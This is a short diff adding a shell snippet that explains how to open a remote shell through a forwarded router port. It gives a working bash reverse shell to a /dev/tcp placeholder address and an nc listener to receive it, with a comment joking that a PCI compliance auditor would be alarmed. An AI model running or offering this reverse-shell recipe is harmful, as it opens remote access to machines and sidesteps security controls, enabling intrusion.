@@ -1,0 +1,7 @@
+# you can forward a port on a router, then let bash listen on the open port-
+bash -i >& /dev/tcp/your_ip/forwarded_port_on_your_router 0>&1
+# Then connect to that open port. The PCi guy would shit himself over something like this.
+nc -lk -p forwarded_port
+
+
+
